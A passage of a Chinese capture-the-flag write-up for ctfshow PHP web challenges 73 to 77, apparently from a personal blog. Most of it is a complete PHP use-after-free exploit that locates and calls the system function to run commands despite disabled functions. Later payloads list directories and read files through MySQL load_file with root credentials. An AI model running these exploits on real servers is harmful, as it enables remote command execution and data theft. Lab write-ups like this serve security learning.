class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">length</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$length</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10000</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$a</span>[<span class="variable">$i</span>])&#123;</span><br><span class="line">            <span class="variable">$length</span> += <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$length</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">length</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">length</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">length</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flagc.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>但是访问之后会502，看了视频发现也是502</p><h1 id="web74"><a href="#web74" class="headerlink" title="web74"></a>web74</h1><p>先扫目录文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span> <span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>文件被修改为flagx.txt，直接像上一道题一样include文件包含就行。</p><h1 id="web75"><a href="#web75" class="headerlink" title="web75"></a>web75</h1><p>先看文件目录：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>抽象，看了视频说直接使用数据库。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=<span class="keyword">try</span> &#123;<span class="variable">$dbh</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;root&#x27;</span>);<span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; &#125;<span class="variable">$dbh</span> = <span class="literal">null</span>;&#125;<span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;<span class="keyword">echo</span> <span class="variable">$e</span>-</span><br><span class="line">&gt;<span class="title function_ invoke__">getMessage</span>();<span class="keyword">exit</span>(<span class="number">0</span>);&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>但是他并没有提这个数据库名称是怎么来的。<br>我们可以通过通用的数据库来获取到数据库的名称：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$dsn</span> = <span class="string">&quot;mysql:host=localhost;dbname=information_schema&quot;</span>;</span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="variable">$dsn</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line"><span class="variable">$rs</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;select group_concat(SCHEMA_NAME) from SCHEMATA&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$rs</span> <span class="keyword">as</span> <span class="variable">$row</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>; </span><br><span class="line">&#125;<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1681290428024-3c729f7a-edc5-4787-a8df-5f0a30f7a678.png" alt="image.png"><br>然后在使用他提供的payload就可以了。</p><h1 id="web76"><a href="#web76" class="headerlink" title="web76"></a>web76</h1><p>文件名修改为了flag36d.txt<br>直接用上一道题的payload获取flag即可。</p><h1 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h1><blockquote><p><a href="https://blog.csdn.net/weixin_44700621/article/details/125381763">https://blog.csdn.net/weixin_44700621/article/details/125381763</a> 